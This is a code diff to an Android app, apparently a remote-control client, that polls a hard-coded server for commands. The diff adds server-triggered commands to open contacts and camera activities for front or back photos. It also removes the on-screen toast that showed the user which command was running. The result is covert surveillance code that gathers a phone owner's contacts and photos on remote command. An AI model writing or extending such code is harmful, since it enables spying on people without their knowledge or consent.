@@ -3,6 +3,7 @@ package net.kashif;
 import android.Manifest;
 import android.app.Activity;
 import android.content.Context;
+import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Vibrator;
@@ -14,7 +15,7 @@ import java.util.*;
 import org.json.JSONObject;
 
 public class MainActivity extends Activity {
-    private static final String SERVER = "http://10.0.54.47:5000"; // IP هاتفك
+    private static final String SERVER = "http://10.0.54.47:5000";
     private String devId;
     private boolean polling = true;
 
@@ -78,25 +79,18 @@ public class MainActivity extends Activity {
     private void executeCommand(final String cmd) {
         runOnUiThread(new Runnable() {
             public void run() {
-                Toast.makeText(MainActivity.this, "تنفيذ: " + cmd, Toast.LENGTH_SHORT).show();
                 if (cmd.equals("vibrate")) {
                     Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                     if (v != null) v.vibrate(1000);
                 } else if (cmd.equals("toast")) {
-                    Toast.makeText(MainActivity.this, "تم استلام الأمر بنجاح!", Toast.LENGTH_LONG).show();
+                    Toast.makeText(MainActivity.this, "تم استلام الأمر!", Toast.LENGTH_LONG).show();
+                } else if (cmd.equals("get_contacts")) {
+                    startActivity(new Intent(MainActivity.this, ContactsActivity.class));
+                } else if (cmd.equals("take_photo") || cmd.equals("take_photo_back")) {
+                    Intent i = new Intent(MainActivity.this, CameraActivity.class);
+                    i.putExtra("camera", cmd.equals("take_photo") ? "front" : "back");
+                    startActivity(i);
                 }
-                
-                new Thread(new Runnable() {
-                    public void run() {
-                        try {
-                            JSONObject j = new JSONObject();
-                            j.put("id", devId);
-                            j.put("type", "cmd_executed");
-                            j.put("data", "تم تنفيذ: " + cmd);
-                            sendReq("/api/report", j.toString());
-                        } catch (Exception e) {}
-                    }
-                }).start();
             }
         });
     }
